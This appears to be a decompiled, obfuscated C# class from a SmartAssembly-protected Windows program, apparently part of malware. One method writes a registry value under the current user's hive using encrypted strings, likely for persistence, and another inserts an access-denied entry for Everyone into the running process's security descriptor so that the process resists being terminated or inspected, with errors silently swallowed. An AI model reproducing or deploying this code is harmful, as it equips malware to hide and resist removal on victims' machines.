using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace esImVhYKuzS;

internal sealed class gNgDTPzmEQFHF
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr dSSTPtmxnojPrF, int kHIHbesnhZGpHqaC, [Out] byte[] qJEgGbDlkkNHV, uint vHGvWVULWF, out uint IZRpEkHAWgZTqh);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr mItaqlmaeebtL, int TWJDcMnzpAcEODFHL, [In] byte[] BtwQckppilzJKuF);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void IAIeqFOHmQs(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107402592)));
			registryKey.SetValue(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107402455)), getString_0(107403610));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor DzHTfVhbPWH(IntPtr intptr_0)
	{
		byte[] qJEgGbDlkkNHV = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, qJEgGbDlkkNHV, 0u, out var IZRpEkHAWgZTqh);
		if ((long)IZRpEkHAWgZTqh > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, qJEgGbDlkkNHV = new byte[IZRpEkHAWgZTqh], IZRpEkHAWgZTqh, out IZRpEkHAWgZTqh))
		{
			return null;
		}
		return new RawSecurityDescriptor(qJEgGbDlkkNHV, 0);
	}

	private void LNcHivINQhw(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void kkpEmHtVbDW()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = DzHTfVhbPWH(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			LNcHivINQhw(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static gNgDTPzmEQFHF()
	{
		Strings.CreateGetStringDelegate(typeof(gNgDTPzmEQFHF));
	}
}
